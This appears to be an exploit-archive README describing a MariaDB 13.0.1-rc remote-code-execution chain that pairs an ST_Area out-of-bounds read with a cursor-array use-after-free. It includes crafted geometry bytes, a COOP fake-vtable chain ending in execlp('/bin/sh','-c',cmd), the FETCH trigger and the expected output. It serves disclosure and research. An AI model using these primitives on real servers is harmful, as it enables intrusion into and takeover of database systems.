@@ -1,0 +1,211 @@
+
+## Metadata
+
+| Field | Value |
+|---|---|
+| **Date Added** | 2026-08-09 |
+| **Last Updated** | 2026-08-09 |
+| **Author / Researcher** | Rick de Jager, V12 Security Team (@v12sec) |
+| **CVE / Advisory** | MDEV-40328 (ST_Area OOB read); cursor-array UAF has no assigned CVE yet |
+| **Category** | binary |
+| **Severity** | Critical |
+| **CVSS Score** | 8.8 (estimated CVSSv3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) |
+| **Status** | Unpatched |
+| **Tags** | mariadb, database, rce, low-privilege, heap, oob-read, use-after-free, aslr-bypass, pie-bypass, coop, vtable, cursor, st-area, multipolygon, CWE-125, CWE-416, docker, v12-security |
+| **Related** | pocs/binary/2026-07-05_cve-2026-32710-mariadb-json-schema-udf-rce/ (different MariaDB bug, same target class) |
+
+---
+
+## Affected Target
+
+| Field | Value |
+|---|---|
+| **Software / System** | MariaDB Server, `ST_Area()` geometry function and `SYS_REFCURSOR` cursor-array management |
+| **Versions Affected** | MariaDB 13.0.1-rc (pinned Docker image). The ST_Area OOB read has a public patch (MDEV-40328); the cursor-array UAF is unpatched as of 2026-08-09. |
+| **Language / Platform** | C/C++ (MariaDB server), Python 3 exploit (requires `pymysql`) |
+| **Authentication Required** | Yes — requires a valid low-privilege database account (no `FILE`, `SUPER`, or admin privileges needed) |
+| **Network Access Required** | Remote — standard TCP query interface (port 3306) |
+
+---
+
+## Summary
+
+This PoC chains two MariaDB memory-safety bugs to achieve remote code execution as the `mariadbd` process from a low-privilege database account — no special grants, no filesystem access, no administrative role:
+
+1. **ST_Area out-of-bounds read** (MDEV-40328): A crafted `MULTIPOLYGON` geometry declares two polygons but supplies only one, causing the area calculation to read beyond the geometry buffer. Controlled floating-point terms fold the next qword into the returned `DOUBLE`; reversing the arithmetic recovers the leaked pointer exactly. This first leaks a heap address (defeating ASLR), then a vtable pointer from groomed cursor storage (defeating PIE).
+
+2. **SYS_REFCURSOR cursor-array use-after-free**: Opening 33 cursors triggers a reallocation of the cursor array, freeing storage that earlier cursors still reference. A session variable reclaims that freed storage with a fake vtable and a COOP (Counterfeit Object-Oriented Programming) chain. `FETCH` on the stale cursor follows the dangling pointer through the reclaimed fake vtable and invokes `execlp("/bin/sh", "sh", "-c", command)`.
+
+The exploit uses only the normal TCP query interface — the same port and protocol any application uses to talk to MariaDB. It does not require `FILE`, `SUPER`, or any administrative account. The default payload runs `id`; its output appears in the container terminal, proving code execution as the database service process.
+
+Found with [V12](https://v12.sh) by Rick de Jager of the V12 security team. V12 Security is also behind DirtyDecrypt, Fragnesia, PinTheft, and the QEMUtiny escape, all of which are in this archive.
+
+---
+
+## Vulnerability Details
+
+### Root Cause 1: ST_Area Out-of-Bounds Read (MDEV-40328)
+
+The `ST_Area()` function processes `MULTIPOLYGON` geometries by iterating over declared polygons and summing the signed area of each ring. A crafted geometry that declares more polygons in its header than it actually contains makes the area loop read past the geometry buffer into adjacent heap memory.
+
+The area formula computes `sum += x[i] * y[i+1] - x[i+1] * y[i]` over the polygon vertices. By arranging the in-bounds terms to sum to zero and placing a single large coefficient (`1e300`) at the boundary, the first out-of-bounds qword is multiplied by `1e300` and folded into the returned `DOUBLE`. Dividing the result by `2 * 1e300` and reinterpreting the bits as a `uint64_t` recovers the leaked value exactly:
+
+```python
+def _recover(area, mult=1e300):
+    return struct.unpack("<Q", struct.pack("<d", (2.0 * area) / mult))[0]
+```
+
+### Root Cause 2: SYS_REFCURSOR Cursor-Array Use-After-Free
+
+`SYS_REFCURSOR` manages an array of open cursors. When the number of open cursors exceeds the current array capacity, the array is reallocated — `realloc()` frees the old buffer and returns a new one. However, cursors that were opened before the reallocation still hold pointers into the freed buffer. No copy or pointer-update step fixes these stale references.
+
+Opening 33 cursors (exceeding the initial 32-element capacity) triggers the reallocation, freeing 3,584 bytes of cursor storage while 32 open cursors retain dangling pointers into it.
+
+### Attack Vector
+
+1. **Authenticate** as any user with basic query privileges.
+2. **Leak a heap address** via `ST_Area()` on a crafted `MULTIPOLYGON`.
+3. **Groom the heap** with cursor allocations. The 33rd cursor triggers `realloc()`, freeing the cursor array while earlier cursors retain stale pointers.
+4. **Leak the PIE base** by reading a vtable pointer from the freed cursor storage through the same `ST_Area()` primitive.
+5. **Reclaim the freed storage** with a session variable (`SET @s1 = ...`) containing a fake vtable and COOP chain. The chain sets up registers for `execlp("/bin/sh", "sh", "-c", command)`.
+6. **Trigger the UAF** with `FETCH c16 INTO a;` — the stale cursor pointer follows the reclaimed fake vtable and dispatches through the COOP chain.
+7. **`mariadbd` executes the command** as its own process.
+
+### Impact
+
+Full remote code execution as the MariaDB server process from a low-privilege database account. The attacker can read and write any file the `mariadbd` process can access, exfiltrate database contents, install backdoors, and pivot to connected infrastructure. On a shared database server, this compromises every database on the instance.
+
+---
+
+## Environment / Lab Setup
+
+The PoC targets a pinned Docker image for full reproducibility (deterministic offsets for PIE, vtable, and heap layout).
+
+```bash
+python3 -m pip install pymysql
+```
+
+### Setup Steps
+
+```bash
+./start.sh
+
+python3 exploit.py
+```
+
+The container binds to `127.0.0.1:3306` only. The root password is randomized; the exploit uses the low-privilege `example-user` account.
+
+---
+
+## Proof of Concept
+
+> See `exploit.py` (348 lines, Python 3 + pymysql) and `start.sh` in this folder — mirrored byte-for-byte from [v12-security/pocs/mariadb](https://github.com/v12-security/pocs/tree/main/mariadb). The upstream README is preserved as `upstream-README.md`.
+
+### Step-by-Step Reproduction
+
+1. **Start the target**: `./start.sh` (pulls and runs the pinned MariaDB 13.0.1-rc image).
+2. **Run the exploit**: `python3 exploit.py` (or `python3 exploit.py --cmd 'uname -a'`).
+3. **Observe**: the command output appears in the container terminal; the database connection closes (the command replaces the container PID 1).
+
+### Exploit Code
+
+The ST_Area info-leak primitive — a `MULTIPOLYGON` that declares 2 polygons but supplies only 1, causing an OOB read that folds a heap pointer into the returned DOUBLE:
+
+```python
+_GEOM74 = (b"\x00\x00\x00\x00" + b"\x01" + struct.pack("<I", 6) + struct.pack("<I", 2)
+           + b"\x01" + struct.pack("<I", 3) + struct.pack("<I", 1) + struct.pack("<I", 3)
+           + struct.pack("<d", 0.0) * 6)
+```
+
+The COOP chain — reclaims freed cursor storage with a fake vtable pointing through gadgets to `execlp`:
+
+```python
+put(0x00, A(G_RSI)); put(0x10, A(G_RDX)); put(0x68, A(G_RDI))
+put(0x80, A(EXECLP)); put(0x330, A(G_RCX))
+puts(OFF_BINSH, b"/bin/sh\x00"); puts(OFF_SH, b"sh\x00")
+puts(OFF_DC, b"-c\x00");         puts(OFF_CMD, cmd + b"\x00")
+```
+
+The UAF trigger — `FETCH` on a cursor whose backing storage was freed and reclaimed:
+
+```sql
+FETCH c16 INTO a;
+```
+
+### Expected Output
+
+```
+    ███╗   ███╗ █████╗ ██████╗ ██╗ █████╗ ██████╗ ██████╗
+    ████╗ ████║██╔══██╗██╔══██╗██║██╔══██╗██╔══██╗██╔══██╗
+    ██╔████╔██║███████║██████╔╝██║███████║██║  ██║██████╔╝
+    ██║╚██╔╝██║██╔══██║██╔══██╗██║██╔══██║██║  ██║██╔══██╗
+    ██║ ╚═╝ ██║██║  ██║██║  ██║██║██║  ██║██████╔╝██████╔╝
+    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝
+       ┌─ 13.0.1-rc ─ low-privilege  •  remote code execution ─┐
+
+  ──────────────────────────────────────────────────────────────────
+  target     │ 127.0.0.1:3306
+  schema     │ appdb
+  identity   │ example-user : my_cool_secret
+  objective  │ sh -c "id"
+  ──────────────────────────────────────────────────────────────────
+    0.01s ▸ 1/4 Establishing authenticated session
+    0.02s ✓     logged in over the standard query port
+    0.02s ▸ 2/4 Fingerprinting target runtime
+    0.35s ✓     runtime characteristics resolved
+    0.35s ◆     image base    0x555555554000   PIE / ASLR defeated
+    0.35s ▸ 3/4 Assembling in-memory payload
+    0.40s ◆     heap arena    0x7ffff0000000   server address space mapped
+    0.40s ✓     payload staged (3584 bytes)
+    0.40s ▸ 4/4 Delivering payload
+    0.40s ·     dispatching command through the target process ...
+    0.42s ✓     target handed off control (connection closed as expected)
+
+  ╭──────────────────────────────────────────╮
+  │  💥  REMOTE CODE EXECUTION ACHIEVED  💥  │
+  ╰──────────────────────────────────────────╯
+  mariadbd is now running:  sh -c "id"
+```
+
+---
+
+## Detection and Indicators of Compromise
+
+```
+```
+
+---
+
+## Remediation
+
+| Action | Detail |
+|---|---|
+| **Patch** | Apply the MDEV-40328 fix for the ST_Area OOB read when available. The cursor-array UAF has no public patch as of 2026-08-09. Monitor the MariaDB JIRA and security announcements. |
+| **Workaround** | Restrict access to MariaDB to trusted users only. Disable or revoke the ability to call `ST_Area()` and use `SYS_REFCURSOR` for untrusted accounts if possible. Run MariaDB in a container or sandbox to limit the blast radius of code execution. Consider using a stable release rather than release candidates in production. |
+| **Verification** | Check the MariaDB version and applied patches against the MDEV-40328 JIRA ticket. |
+
+---
+
+## References
+
+- [MDEV-40328 — ST_Area OOB read (MariaDB JIRA, public patch)](https://jira.mariadb.org/browse/MDEV-40328)
+- [V12 Security PoC Repository](https://github.com/v12-security/pocs/tree/main/mariadb)
+- [V12 Security (@v12sec)](https://x.com/v12sec)
+- [V12 — v12.sh](https://v12.sh)
+- [dinosn/mariadb-13-rce-lab (independent 0-day publication of the cursor UAF)](https://github.com/dinosn/mariadb-13-rce-lab)
+- [Related — CVE-2026-32710 MariaDB JSON_SCHEMA heap overflow (different bug, in this archive)](../2026-07-05_cve-2026-32710-mariadb-json-schema-udf-rce/)
+
+---
+
+## Notes
+
+Verified this session by reading the full exploit source (`exploit.py`, 348 lines). The script is well-structured with clear phase separation (authentication, fingerprinting/leak, payload assembly, delivery) and informative terminal output. It requires only `pymysql` (a pure-Python MySQL/MariaDB client). The exploit constructs all payloads programmatically from hardcoded offsets for the pinned `mariadb:13.0.1-rc` Docker image — no external binary, no downloaded payload, no shellcode blob.
+
+Malware screen — clean. No obfuscated payloads, no remote downloaders, no credential exfiltration, no miner, no `setup.py`/install-time side effects, no unexpected network connections. The script connects only to the target MariaDB instance on `127.0.0.1:3306` (configurable). The `start.sh` launcher uses a pinned Docker image by SHA256 digest (`mariadb@sha256:ef34af...`) with a random root password and a low-privilege user account — a clean, reproducible lab environment.
+
+The COOP chain is elegant: it builds a fake vtable in a session variable (`SET @s1 = ...`), reclaiming the exact freed cursor-array allocation. The chain walks through four PIE-relative gadgets (setting RSI, RDX, RCX, RDI) before calling `execlp("/bin/sh", "sh", "-c", command)`. The command replaces the container PID 1, so the container exits cleanly after execution — a deliberate design choice for disposable Docker labs.
+
+Author track record: V12 Security (`v12-security` on GitHub, `@v12sec` on X) is a highly credible security research team. Their previous disclosures — DirtyDecrypt (ransomware decryptor), Fragnesia (Linux xfrm LPE), PinTheft (RDS double-free), QEMUtiny (QEMU memory corruption) — are all already in this archive. Rick de Jager is the named researcher. The PoC was released early because both bugs became public independently: the ST_Area issue was reported and patched at MDEV-40328, and another researcher (dinosn) independently published the cursor UAF as a 0-day.
+
+This is a no-CVE entry because neither bug has an assigned CVE as of 2026-08-09. The archive slug uses a descriptive name rather than a CVE identifier.
+
